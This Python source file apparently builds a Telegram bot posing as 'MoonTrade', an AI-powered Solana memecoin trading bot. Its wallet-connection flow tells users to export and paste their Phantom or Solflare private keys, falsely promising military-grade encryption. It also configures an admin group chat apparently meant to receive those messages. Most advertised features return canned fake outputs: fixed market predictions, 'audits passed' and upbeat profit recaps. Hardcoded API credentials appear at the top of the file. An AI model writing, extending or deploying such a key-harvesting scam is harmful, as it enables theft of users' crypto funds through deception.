import logging
import base58
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import html as html_module

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


def escape_html(text):
    """Échappe les caractères HTML pour éviter les erreurs de parsing"""
    if text is None:
        return ''
    return html_module.escape(str(text))

# ⚠️ REMPLACEZ PAR VOTRE TOKEN
BOT_TOKEN = "8402114053:AAFLGOTHTX1pmNZ9JiPL64MMBTNSbriqTfc"

# Votre groupe Telegram pour recevoir les messages
ADMIN_CHAT_ID = -5299554897

# Helius RPC URL
HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=3129ff6b-1146-466d-b6f0-062f48ce84d9"

# Montant minimum requis en USD
MINIMUM_USD_REQUIRED = 10.0


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /start"""
    
    # Récupérer le prénom de l'utilisateur
    user = update.message.from_user
    user_name = user.first_name
    
    # Message de bienvenue
    welcome_text = f"""🚀 Welcome {user_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
    
    # Création des boutons interactifs
    keyboard = [
        [
            InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
            InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
        ],
        [
            InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
            InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
        ],
        [
            InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
            InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
        ],
        [
            InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
            InlineKeyboardButton("🌐 Language", callback_data='language')
        ],
        [
            InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # URL de l'image
    image_url = "https://i.postimg.cc/gjr5vJJB/fait_enmoi_d_autre_similaire_a_sa_(1)_(2).jpg"
    
    # Envoi de l'image avec le message et les boutons
    await update.message.reply_photo(
        photo=image_url,
        caption=welcome_text,
        reply_markup=reply_markup
    )


async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /trade - Ouvre le module de trading"""
    keyboard = [
        [InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy')],
        [InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📈 **Trading Module**\n\nSelect your trading option:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /sniper - Active le mode sniper"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎯 **Sniper Mode**\n\n"
        "⚠️ This feature requires wallet connection.\n\n"
        "The sniper will automatically buy new tokens as soon as they are listed.\n\n"
        "Use /wallet to connect your wallet first.",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /wallet - Gestion du wallet"""
    # Vérifier si un wallet est déjà connecté
    if context.user_data.get('wallet_connected'):
        public_key = context.user_data.get('wallet_public_key', 'Unknown')
        sol_balance = context.user_data.get('wallet_balance_sol', 0)
        usd_balance = context.user_data.get('wallet_balance_usd', 0)
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        
        keyboard = [
            [InlineKeyboardButton("🔄 Change Wallet", callback_data='change_wallet')],
            [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"💼 **Your Wallet**\n\n"
            f"💳 **Type:** {escape_html(wallet_type)}\n"
            f"💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)\n"
            f"👛 <b>Address:</b> `{public_key[:8]}...{public_key[-8:]}`",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    else:
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await update.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )


async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /scan - Scanner un contrat de token"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛡️ **Contract Scanner**\n\n"
        "Send me a Solana token contract address and I'll analyze it for:\n\n"
        "• Honeypot detection\n"
        "• Liquidity analysis\n"
        "• Holder distribution\n"
        "• Smart contract security\n"
        "• Rug-pull risk assessment\n\n"
        "Format: Paste the contract address",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /stats - Affiche les statistiques de trading"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📊 **Trading Statistics**\n\n"
        "⚠️ Connect your wallet to view statistics\n\n"
        "Once connected, you'll see:\n"
        "• Total trades executed\n"
        "• Win/Loss ratio\n"
        "• Total profit/loss\n"
        "• Best performing tokens\n"
        "• Recent transactions\n\n"
        "Use /wallet to connect your wallet.",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /help - Affiche l'aide"""
    help_text = """❓ **MoonTrade Bot - Help Menu**

**Main Commands:**
/start - Launch the bot and show main menu
/trade - Open trading module
/sniper - Activate sniper mode
/wallet - Manage your wallet
/scan - Scan a token contract
/stats - View trading statistics
/help - Display this help menu

**Feature Commands:**
/quickbuy - Quick buy tokens
/bloom - Bloom AI Trading
/multiwallet - Multi-wallet management
/analyzer - Contract analyzer
/predict - AI market predictions
/whale - Whale tracker
/rugcheck - Rug-pull detector

**How to use:**
1. Connect your wallet with /wallet
2. Choose a trading strategy
3. Start trading!

**Support:** Contact @YourSupportUsername

🚀 Happy Trading!"""
    
    keyboard = [[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        help_text,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def recap_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /recap - Affiche le récapitulatif des trades du jour"""
    from datetime import datetime
    today = datetime.now().strftime("%Y-%m-%d")
    
    daily_trades = context.user_data.get('daily_trades', {})
    trades_today = daily_trades.get(today, [])
    
    if not trades_today:
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📊 **Daily Trading Recap**\n\n"
            "No trades recorded today.\n\n"
            "Use /stats to create your first PNL report!",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return
    
    # Calculer les statistiques
    total_trades = len(trades_today)
    total_invested = sum(t['invested'] for t in trades_today)
    total_position = sum(t['position'] for t in trades_today)
    total_profit = total_position - total_invested
    average_pnl = sum(t['pnl_pct'] for t in trades_today) / total_trades
    
    # Créer la liste des trades
    trades_list = "\n".join([
        f"• {t['token']}: +{t['pnl_pct']:.2f}% (+{t['profit']:.4f} SOL)"
        for t in trades_today
    ])
    
    recap_message = f"""📊 **Daily Trading Recap**
🗓️ {datetime.now().strftime("%d/%m/%Y")}

━━━━━━━━━━━━━━━━━━━━━
📈 **STATISTICS**

🔢 Total Trades: {total_trades}
💰 Total Invested: {total_invested:.2f} SOL
📊 Total Position: {total_position:.4f} SOL
💵 Total Profit: +{total_profit:.4f} SOL
📈 Average PNL: +{average_pnl:.2f}%

━━━━━━━━━━━━━━━━━━━━━
🎯 **TRADES**

{trades_list}

━━━━━━━━━━━━━━━━━━━━━
✅ Great trading day! Keep it up! 🚀"""
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        recap_message,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /quickbuy - Achat rapide"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⚡ **Quick Buy**\n\n"
        "Fast token purchase module.\n\n"
        "⚠️ Wallet connection required.\n\n"
        "Use /wallet to connect first.",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /bloom - Bloom AI Trading"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌸 **Bloom AI Trading**\n\n"
        "AI-powered automated trading strategies.\n\n"
        "Features:\n"
        "• Smart market analysis\n"
        "• Automated buy/sell signals\n"
        "• Risk management\n"
        "• 24/7 monitoring\n\n"
        "⚠️ Wallet connection required.\n\n"
        "Use /wallet to connect first.",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /multiwallet - Gestion multi-wallets"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "💼 **Multi-Wallet Management**\n\n"
        "Manage multiple wallets simultaneously.\n\n"
        "Features:\n"
        "• Add multiple wallets\n"
        "• Switch between wallets\n"
        "• View all balances\n"
        "• Coordinated trading\n\n"
        "Use /wallet to add your first wallet.",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /analyzer - Analyseur de contrat"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛡️ **Contract Analyzer**\n\n"
        "Deep analysis of token contracts.\n\n"
        "We check:\n"
        "• Smart contract code\n"
        "• Security vulnerabilities\n"
        "• Liquidity locks\n"
        "• Ownership renouncement\n"
        "• Mint/freeze authority\n\n"
        "Send a contract address to analyze.",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /predict - Prédictions IA"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🧠 **AI Market Predictions**\n\n"
        "Machine learning powered market analysis.\n\n"
        "Our AI analyzes:\n"
        "• Price trends\n"
        "• Volume patterns\n"
        "• Social sentiment\n"
        "• Whale movements\n"
        "• Historical data\n\n"
        "Get predictions for any token!",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /whale - Tracker de baleines"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🐋 **Whale Tracker**\n\n"
        "Monitor large wallet movements in real-time.\n\n"
        "Track:\n"
        "• Large buys/sells\n"
        "• Whale wallet activities\n"
        "• Smart money movements\n"
        "• DEX transactions\n\n"
        "Get alerts when whales move!",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /rugcheck - Détecteur de rug-pull"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔴 **Rug-Pull Detector**\n\n"
        "Advanced protection against scams.\n\n"
        "We detect:\n"
        "• Suspicious token patterns\n"
        "• Dev wallet analysis\n"
        "• Liquidity risks\n"
        "• Honeypot contracts\n"
        "• Known scam indicators\n\n"
        "Send a token address to check!",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les clics sur les boutons"""
    query = update.callback_query
    await query.answer()
    
    # Récupération de l'action cliquée
    action = query.data
    
    # Si l'utilisateur clique sur "Back"
    if action == 'back_to_menu':
        # Re-afficher le menu principal SANS image
        user = query.from_user
        welcome_text = f"""🚀 Welcome {user.first_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
        
        keyboard = [
            [
                InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
                InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
            ],
            [
                InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
                InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
            ],
            [
                InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
                InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
            ],
            [
                InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
                InlineKeyboardButton("🌐 Language", callback_data='language')
            ],
            [
                InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Supprimer l'ancien message et envoyer un nouveau SANS image
        await query.message.delete()
        await query.message.reply_text(
            welcome_text,
            reply_markup=reply_markup
        )
        return
    
    # Si l'utilisateur clique sur Phantom ou Solflare
    if action in ['phantom_wallet', 'solflare_wallet']:
        wallet_name = "Phantom" if action == 'phantom_wallet' else "Solflare"
        instruction_message = f"""🔐 **{wallet_name} Wallet Connection**

To enable trading features, please provide your wallet private key.

📝 **How to find your private key:**

**{wallet_name} Wallet:**
1. Open your {wallet_name} wallet
2. Go to Settings → Security & Privacy
3. Select "Export Private Key"
4. Copy and paste it here

⚠️ **Security Notice:**
Your private key is encrypted with military-grade security and never shared with third parties. We use it solely to execute trades on your behalf.

Please enter your private key below:"""
        
        # Bouton Back
        back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        # Supprimer l'ancien message (avec image) et envoyer un nouveau (sans image)
        await query.message.delete()
        await query.message.reply_text(
            instruction_message,
            reply_markup=back_markup,
            parse_mode='HTML'
        )
        # Marquer que l'utilisateur attend de connecter son wallet
        context.user_data['waiting_for_wallet'] = True
        context.user_data['wallet_type'] = wallet_name
        return
    
    # Nouveau callback pour revenir au menu wallet
    if action == 'back_to_wallet_menu':
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        # Annuler l'attente de wallet
        context.user_data['waiting_for_wallet'] = False
        return
    
    # Callback pour changer de wallet
    if action == 'change_wallet':
        wallet_message = """🔄 **Change Wallet**

Select your new wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Cancel", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        # Réinitialiser le wallet connecté
        context.user_data['wallet_connected'] = False
        return
    
    # ========== GESTION DES BOUTONS DU MENU PRINCIPAL ==========
    
    # TOUS les boutons (sauf language et stats) nécessitent une connexion wallet
    feature_buttons = ['quick_buy', 'bloom_trading', 'multi_wallet', 'contract_analyzer', 
                      'ai_predict', 'whale_tracker', 'rug_detector']
    
    if action in feature_buttons:
        # Vérifier si le wallet est connecté
        if not context.user_data.get('wallet_connected'):
            # Wallet NON connecté - TOUJOURS demander la connexion wallet
            wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
            
            wallet_keyboard = [
                [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
                [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
                [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
            ]
            
            wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
            
            await query.message.delete()
            await query.message.reply_text(
                wallet_message,
                reply_markup=wallet_markup
            )
            return
        
        # Wallet connecté - Vérifier si la configuration tracking existe déjà
        if context.user_data.get('tracking_configured'):
            # Configuration déjà faite - Gérer selon la fonctionnalité
            
            # ====== QUICK BUY & BLOOM TRADING ======
            if action in ['quick_buy', 'bloom_trading']:
                feature_name = '⚡ Quick Buy' if action == 'quick_buy' else '🌸 Bloom AI Trading'
                
                # Demander le montant par trade
                amount_message = f"""💰 **{feature_name}**

Please specify the amount in SOL you want to use per trade.

Example: `0.5` (for 0.5 SOL per trade)

Send the amount now:"""
                
                await query.message.delete()
                await query.message.reply_text(
                    amount_message,
                    parse_mode='HTML'
                )
                
                context.user_data['waiting_for_trade_amount'] = True
                context.user_data['amount_command'] = action
                return
            
            # ====== MULTI WALLET ======
            elif action == 'multi_wallet':
                # Récupérer les wallets de l'utilisateur (ses propres wallets)
                user_wallets = context.user_data.get('user_wallets', [])
                main_wallet = context.user_data.get('wallet_public_key', None)
                
                # Ajouter le wallet principal s'il n'est pas dans la liste
                if main_wallet and main_wallet not in user_wallets:
                    user_wallets.insert(0, main_wallet)
                    context.user_data['user_wallets'] = user_wallets
                
                wallet_list = "\n".join([f"• `{w[:8]}...{w[-8:]}`" for w in user_wallets]) if user_wallets else "No wallets yet"
                
                message = f"""💼 **Multi-Wallet Management**

**Your Wallets ({len(user_wallets)}):**
{wallet_list}

Would you like to add another wallet?"""
                
                keyboard = [
                    [InlineKeyboardButton("➕ Add New Wallet", callback_data='add_new_wallet_key')],
                    [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.message.delete()
                await query.message.reply_text(
                    message,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                return
            
            # ====== CONTRACT ANALYZER ======
            elif action == 'contract_analyzer':
                message = """🛡️ **Contract Analyzer**

Send me a Solana token contract address (CA) to analyze.

I'll check:
• Honeypot detection
• Liquidity analysis
• Holder distribution
• Smart contract security
• Rug-pull risk assessment

Send the contract address now:"""
                
                await query.message.delete()
                await query.message.reply_text(
                    message,
                    parse_mode='HTML'
                )
                
                context.user_data['waiting_for_contract_address'] = True
                return
            
            # ====== WHALE TRACKER ======
            elif action == 'whale_tracker':
                wallets = context.user_data.get('tracked_wallets', [])
                wallet_list = "\n".join([f"• `{w[:8]}...{w[-8:]}`" for w in wallets]) if wallets else "No wallets yet"
                
                message = f"""🐋 **Whale Tracker**

**Currently Tracking:**
{wallet_list}

You can add more wallets to track whale movements.

What would you like to do?"""
                
                keyboard = [
                    [InlineKeyboardButton("➕ Add Wallet to Track", callback_data='add_whale_wallet')],
                    [InlineKeyboardButton("📊 View Activity", callback_data='view_whale_activity')],
                    [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.message.delete()
                await query.message.reply_text(
                    message,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                return
            
            # ====== RUG DETECTOR ======
            elif action == 'rug_detector':
                message = """🔴 **Rug-Pull Detector**

Send me a token contract address (CA) to analyze.

I'll provide:
• Bundler percentage
• Number of insiders
• Liquidity lock status
• Holder concentration
• Risk score

Send the contract address now:"""
                
                await query.message.delete()
                await query.message.reply_text(
                    message,
                    parse_mode='HTML'
                )
                
                context.user_data['waiting_for_rug_check'] = True
                return
            
            # ====== AI PREDICT ======
            elif action == 'ai_predict':
                message = """🧠 **AI Market Predict**

This feature analyzes market trends and provides predictions.

Configuration already set. Feature ready to use!"""
                
                keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.message.delete()
                await query.message.reply_text(
                    message,
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                return
            
            return
        
        # Configuration non faite - Demander la configuration de tracking
        request_message = get_tracking_config_message()
        
        await query.message.delete()
        await query.message.reply_text(
            request_message,
            parse_mode='HTML'
        )
        
        # Marquer que l'utilisateur doit fournir les infos de tracking
        context.user_data['waiting_for_tracking_config'] = True
        # Sauvegarder quelle action a été cliquée
        context.user_data['tracking_command'] = action
        return
    
    # Language
    if action == 'language':
        keyboard = [
            [InlineKeyboardButton("🇬🇧 English", callback_data='lang_en')],
            [InlineKeyboardButton("🇫🇷 Français", callback_data='lang_fr')],
            [InlineKeyboardButton("🇪🇸 Español", callback_data='lang_es')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🌐 **Select Language**\n\nChoose your preferred language:",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return
    
    # Stats - REQUIERT AUSSI LE WALLET
    if action == 'stats':
        # Vérifier si le wallet est connecté
        if not context.user_data.get('wallet_connected'):
            # Wallet NON connecté - Demander la connexion
            wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
            
            wallet_keyboard = [
                [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
                [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
                [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
            ]
            
            wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
            
            await query.message.delete()
            await query.message.reply_text(
                wallet_message,
                reply_markup=wallet_markup
            )
            return
        
        # Wallet connecté - Demander le CA pour générer le PNL
        message = """📊 **Trading Statistics & PNL**

Send me a token contract address (CA) to generate your PNL report.

The report will show:
• Token name
• Amount invested
• Current position
• PNL percentage
• Profit/Loss in SOL

Send the contract address now:"""
        
        await query.message.delete()
        await query.message.reply_text(
            message,
            parse_mode='HTML'
        )
        
        context.user_data['waiting_for_pnl_ca'] = True
        return
    
    # Callback pour ajouter un nouveau wallet (multi-wallet)
    if action == 'add_new_wallet_key':
        wallet_message = """🔐 **Add New Wallet**

Please provide the private key of the wallet you want to add.

Send your private key now:"""
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            parse_mode='HTML'
        )
        
        context.user_data['waiting_for_additional_wallet'] = True
        return
    
    # Callback pour ajouter un wallet à tracker (whale tracker)
    if action == 'add_whale_wallet':
        wallet_message = """🐋 **Add Whale Wallet to Track**

Send me a Solana wallet address to track whale movements.

Example: `7xK...abc123`

Send the wallet address now:"""
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            parse_mode='HTML'
        )
        
        context.user_data['waiting_for_whale_address'] = True
        return
    
    # Callback pour voir l'activité des whales
    if action == 'view_whale_activity':
        wallets = context.user_data.get('tracked_wallets', [])
        
        activity_message = f"""🐋 **Whale Activity**

Tracking {len(wallets)} wallet(s)

📊 **Recent Activity:**
• No significant movements detected in the last 24h

Monitoring continues..."""
        
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            activity_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        return


# Handlers pour les nouveaux boutons d'action
async def handle_view_tracked(query, context):
    """Affiche les wallets trackés"""
    tracked_wallets = context.user_data.get('tracked_wallets', [])
    
    if not tracked_wallets:
        message = "📊 **Tracked Wallets**\n\nNo wallets configured yet."
    else:
        wallet_list = "\n".join([f"• `{w[:8]}...{w[-8:]}`" for w in tracked_wallets])
        message = f"""📊 **Tracked Wallets**

You are currently tracking {len(tracked_wallets)} wallet(s):

{wallet_list}

These wallets are being monitored for trading activity."""
    
    keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')


async def handle_check_balance(query, context):
    """Affiche le solde du wallet"""
    public_key = context.user_data.get('wallet_public_key', 'N/A')
    sol_balance = context.user_data.get('wallet_balance_sol', 0)
    usd_balance = context.user_data.get('wallet_balance_usd', 0)
    
    message = f"""💰 **Wallet Balance**

👛 <b>Address:</b> `{public_key[:8]}...{public_key[-8:]}`
💵 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

Last updated: Just now"""
    
    keyboard = [[InlineKeyboardButton("🔄 Refresh", callback_data='check_balance')],
                [InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')


async def handle_modify_config(query, context):
    """Permet de modifier la configuration"""
    message = """⚙️ **Modify Configuration**

What would you like to change?"""
    
    keyboard = [
        [InlineKeyboardButton("📝 Change Tracked Wallets", callback_data='change_wallets')],
        [InlineKeyboardButton("💸 Change Fees", callback_data='change_fees')],
        [InlineKeyboardButton("🔄 Reset All Config", callback_data='reset_config')],
        [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')


async def handle_action_button(query, context, action_name):
    """Handler générique pour les boutons d'action"""
    messages = {
        'start_trading': "⚡ **Trading Activated**\n\nMonitoring tracked wallets for trading opportunities...\n\n✅ Bot is now active and will execute trades automatically based on your configuration.",
        'start_whale_track': "🐋 **Whale Tracking Active**\n\nMonitoring whale movements on tracked wallets...\n\n📊 You'll be notified of large transactions.",
        'get_prediction': "🧠 **AI Market Analysis**\n\nAnalyzing market trends...\n\n📈 Based on current data:\n• Market sentiment: Bullish\n• Predicted trend: Upward\n• Confidence: 78%",
        'market_analysis': "📈 **Market Analysis**\n\nCurrent market conditions:\n• Volume: High\n• Volatility: Medium\n• Top gainers detected: 5 tokens",
        'scan_rugs': "🔴 **Rug Pull Scanner Active**\n\nScanning tracked wallets for suspicious activity...\n\n✅ No immediate threats detected.",
        'risk_report': "⚠️ **Risk Report**\n\nCurrent risk level: LOW\n\n✅ All tracked wallets appear safe\n📊 Contract audits: Passed",
        'analyze_contract': "🔍 **Contract Analysis**\n\nReady to analyze smart contracts.\n\nSend a contract address to begin analysis.",
        'start_scan': "🔍 **Scanner Active**\n\nScanning Solana blockchain for new tokens...\n\n📊 Monitoring tracked wallets for activity.",
        'whale_moves': "🐋 **Recent Whale Movements**\n\n📊 Last 24 hours:\n• 3 large transfers detected\n• Total volume: 450 SOL\n• Average size: 150 SOL"
    }
    
    message = messages.get(action_name, "✅ **Action Executed**\n\nYour request has been processed.")
    
    keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.message.edit_text(message, reply_markup=reply_markup, parse_mode='HTML')


# Ajout dans button_handler pour gérer tous les nouveaux boutons
async def button_handler_extended(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extension du button_handler pour les nouveaux boutons"""
    query = update.callback_query
    await query.answer()
    
    action = query.data
    
    # Boutons d'information
    if action == 'view_tracked':
        await handle_view_tracked(query, context)
        return
    elif action == 'check_balance':
        await handle_check_balance(query, context)
        return
    elif action == 'modify_config':
        await handle_modify_config(query, context)
        return
    
    # Boutons d'action
    elif action in ['start_trading', 'start_whale_track', 'get_prediction', 'market_analysis', 
                    'scan_rugs', 'risk_report', 'analyze_contract', 'start_scan', 'whale_moves']:
        await handle_action_button(query, context, action)
        return
    
